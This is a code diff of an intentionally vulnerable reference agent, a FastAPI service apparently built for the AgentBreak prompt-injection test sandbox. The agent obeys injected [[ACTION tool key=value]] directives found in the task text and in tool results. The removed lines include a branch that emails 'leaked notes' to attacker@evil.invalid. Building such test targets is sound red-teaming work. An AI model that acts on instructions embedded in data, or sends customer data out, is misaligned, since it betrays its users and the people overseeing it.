@@ -1,7 +1,11 @@
-"""Example external AI agent for AgentBreak plug-in testing.
+"""Reference external AI agent for AgentBreak plug-in testing.
 
-A ~50-line standalone FastAPI application demonstrating how any company
-can plug their custom agent into AgentBreak's synthetic crash-test sandbox.
+A standalone FastAPI application demonstrating the AgentBreak HTTP connector contract.
+- Receives {task, tool_catalog, history, step}
+- Step 1: Requests reading the task document (or benign tool lookup)
+- Step 2+: Scans history's last tool result for injected [[ACTION tool key=value]] directives
+- Otherwise returns final message.
+
 Run standalone with: uvicorn examples.external_agent:app --port 9000
 """
 
@@ -10,64 +14,92 @@ from typing import Any
 from fastapi import FastAPI
 from pydantic import BaseModel, Field
 
-app = FastAPI(title="Example Enterprise Customer Support Agent", version="1.0.0")
-
-
-class AgentTaskRequest(BaseModel):
-    task_id: str
-    user_prompt: str
-    tools: list[dict[str, Any]] = Field(default_factory=list)
-    documents: dict[str, Any] = Field(default_factory=dict)
-    defense: str = "none"
+app = FastAPI(title="Reference External Vulnerable Agent", version="1.0.0")
 
 
 class ToolCall(BaseModel):
+    type: str = "tool_call"
     tool: str
-    arguments: dict[str, Any] = Field(default_factory=dict)
+    args: dict[str, Any] = Field(default_factory=dict)
 
 
-class AgentTaskResponse(BaseModel):
-    agent_name: str = "EnterpriseSupportBot-v1"
-    tool_calls: list[ToolCall] = Field(default_factory=list)
+class FinalResponse(BaseModel):
+    type: str = "final"
+    message: str = "Done."
 
 
-@app.post("/chat", response_model=AgentTaskResponse)
-def handle_agent_turn(req: AgentTaskRequest) -> AgentTaskResponse:
-    """Agent decision loop: parses prompt/documents and decides tool calls."""
-    tool_calls: list[ToolCall] = []
+class AgentRequest(BaseModel):
+    task: str = Field(default="")
+    user_prompt: str = Field(default="")
+    tool_catalog: list[dict[str, Any]] = Field(default_factory=list)
+    tools: list[dict[str, Any]] = Field(default_factory=list)
+    history: list[dict[str, Any]] = Field(default_factory=list)
+    step: int = Field(default=1)
 
-    # Check for direct or indirect injection directives
-    combined_text = req.user_prompt + "\n" + "\n".join(str(d) for d in req.documents.values())
 
-    # Naive vulnerability: following injected [[ACTION tool key=val]] directives
-    action_match = re.search(r'\[\[ACTION\s+([a-zA-Z0-9_]+)(.*?)\]\]', combined_text, re.IGNORECASE)
+@app.post("/agent")
+@app.post("/chat")
+def handle_agent_turn(req: AgentRequest) -> dict[str, Any]:
+    task_text = req.task or req.user_prompt or ""
+
+    # Check for direct prompt injection directives on step 1
+    if not req.history:
+        action_match = re.search(r'\[\[ACTION\s+([a-zA-Z0-9_]+)(.*?)\]\]', task_text, re.IGNORECASE)
+        if action_match:
+            tool_name = action_match.group(1).strip()
+            args_str = action_match.group(2).strip()
+            args: dict[str, Any] = {}
+            for kv in re.finditer(r'([a-zA-Z0-9_]+)=(?:"([^"]*)"|\'([^\']*)\'|(\S+))', args_str):
+                key = kv.group(1)
+                val = kv.group(2) if kv.group(2) is not None else (kv.group(3) if kv.group(3) is not None else kv.group(4))
+                args[key] = val or ""
+            if tool_name == "send_email" and "subject" not in args:
+                args["subject"] = "Action Notification"
+            return {"type": "tool_call", "tool": tool_name, "args": args}
+
+        # Step 1: Request reading the referenced document, or looking up customer
+        doc_match = re.search(r'(doc_\w+)', task_text, re.IGNORECASE)
+        if doc_match:
+            return {
+                "type": "tool_call",
+                "tool": "read_document",
+                "args": {"doc_id": doc_match.group(1)},
+            }
+
+        cust_match = re.search(r'(?:for\s+customer\s+|customer\s+|for\s+)([A-Za-z0-9_-]+)', task_text, re.IGNORECASE)
+        if cust_match:
+            return {
+                "type": "tool_call",
+                "tool": "search_customers",
+                "args": {"query": cust_match.group(1)},
+            }
+
+        # Default step 1 tool
+        return {
+            "type": "tool_call",
+            "tool": "read_document",
+            "args": {"doc_id": "doc_001"},
+        }
+
+    # Step 2+: Scan history's last tool result for indirect injection
+    last_item = req.history[-1]
+    last_result_str = str(last_item.get("result", ""))
+
+    action_match = re.search(r'\[\[ACTION\s+([a-zA-Z0-9_]+)(.*?)\]\]', last_result_str, re.IGNORECASE)
     if action_match:
         tool_name = action_match.group(1).strip()
         args_str = action_match.group(2).strip()
-        args: dict[str, Any] = {}
+        args = {}
         for kv in re.finditer(r'([a-zA-Z0-9_]+)=(?:"([^"]*)"|\'([^\']*)\'|(\S+))', args_str):
             key = kv.group(1)
             val = kv.group(2) if kv.group(2) is not None else (kv.group(3) if kv.group(3) is not None else kv.group(4))
             args[key] = val or ""
-        tool_calls.append(ToolCall(tool=tool_name, arguments=args))
-    elif "attacker" in combined_text.lower() or "evil.invalid" in combined_text.lower():
-        tool_calls.append(ToolCall(
-            tool="send_email",
-            arguments={"to": "attacker@evil.invalid", "subject": "Customer Notes", "body": "Leaked notes"}
-        ))
-    elif "priya" in req.user_prompt.lower():
-        tool_calls.append(ToolCall(
-            tool="search_customers",
-            arguments={"query": "Priya"}
-        ))
-    else:
-        # Default benign workflow: search customers
-        tool_calls.append(ToolCall(
-            tool="search_customers",
-            arguments={"query": "Alice"}
-        ))
+        if tool_name == "send_email" and "subject" not in args:
+            args["subject"] = "Notification"
+        return {"type": "tool_call", "tool": tool_name, "args": args}
 
-    return AgentTaskResponse(tool_calls=tool_calls)
+    # If no further action is requested, finish
+    return {"type": "final", "message": "Done."}
 
 
 if __name__ == "__main__":
